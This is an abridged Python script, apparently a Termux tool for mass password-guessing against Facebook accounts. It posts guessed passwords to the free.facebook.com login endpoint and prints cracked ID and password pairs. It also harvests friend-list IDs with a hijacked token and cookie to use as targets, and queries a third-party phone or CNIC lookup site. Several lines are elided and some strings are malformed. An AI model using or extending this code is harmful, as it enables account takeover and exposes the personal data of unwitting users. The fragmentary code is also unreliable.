...
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        ...
        pass
"-------[@pra link]----------"
minyu1837="https://free.facebook.com/auth/login"
...
jdlso83="{'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'', 'x-fb-connection-type': 'unknown', 'x-fb-friendly_name': 'authenticate', 'content-encoding': 'application/x-www-form-urlencoded', 'x-tigon-is_retry': 'false', 'x-fb-http-engine': 'Liger'}"
...
yt="https://youtube.com/@bd-termux5947"
...
def _qlog():
        ...
        head = {"user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"}
        cok = {'cookie':cookie}
        try:
...
def crackmbasic(idf,pwv):
        ...
        for pw in pwv:
                        ...
                        r = requests.post(f"https://free.facebook.com/auth/login",headers=head,verify=True,data=dataa)
                        ...
                        if "www.facebook.com" in r.text:
                                print(f'   \r {rp}[BRAND-CP] {idf} | {pw}{s}')     
...
def create_file():
        try:
                ...
                _qlog()
        try:
                r = requests.get('https://free.facebook.com/me?fields=id,name&access_token='+tok, cookies={'cookie':cok})
                name = json.loads(r.text)['name']
        except:
                name = "User"
                _qlog()
...
def bulk_file():
        ...
        for i in range(1,limit):
                ...
                qs = random.choice(Types)
                try:
                        sy = requests.get('https://free.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr= json.loads(sy)
...
def number_detail():
        ...
        os.system("clear");print(logo)
        numm = input(" Number : ")
        head = {'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5": "https://freepicccs.com/index2.php?msg=Please%20Enter%20atleast%201%20Mobile%20Number%20or%20CNIC"}
        dataa = {'cnnum': numm}
